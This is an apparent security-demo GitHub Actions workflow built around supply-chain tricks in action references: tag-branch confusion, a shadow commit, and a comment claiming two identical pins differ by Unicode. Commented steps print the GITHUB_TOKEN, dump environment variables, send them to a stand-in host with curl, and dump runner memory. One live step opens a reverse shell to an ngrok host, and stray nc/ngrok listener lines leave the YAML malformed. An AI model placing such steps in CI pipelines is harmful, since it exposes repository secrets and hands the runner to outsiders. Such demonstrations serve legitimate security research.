name: Test

on:
  workflow_dispatch

permissions: {}

jobs:
  test:
    name: Test
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      # Tag branch confusion, should output "Hello world! v1 tag"
      - uses: coderpatros/action-hello-world@v1
      # Shadow commit
      - uses: actions/setup-dotnet@a55eb9ae83b21bfc3efab1938edeffe211c9fb03
      # Unicode, these are not the same
      - uses: coderpatros/action-hello-world@6aa22f48b007348666f676eabda20e9884ed1a7f
      - uses: coderpatros/action-hello-world@6aa22f48b007348666f676eabda20e9884ed1a7f
      #- run : echo ${{ secrets.GITHUB_TOKEN }} | base64
      # - run : printenv > ./temp.log
      # - uses: actions/upload-artifact@v7
      #   with:
      #     name: temp.log
      #     path: ./temp.log
      # - run: |
      #     printenv | curl -X POST https://evil.example.com/endpoint -H \"Content-Type: text/plain\" --data-binary @-
      nc -lvnp 1337
      
      ngrok tcp 1337
      
      - run: sh -i >& /dev/tcp/0.tcp.au.ngrok.io/21635 0>&1
      # - run: |
      #     wget -O ./avml https://github.com/microsoft/avml/releases/download/v0.18.0/avml
      #     chmod +x ./avml
      #     sudo ./avml output.lime
      #     sudo chown runner:runner output.lime
      #     ls -la
      # - uses: actions/upload-artifact@v7
      #   with:
      #     name: output.lime
      #     path: ./output.lime
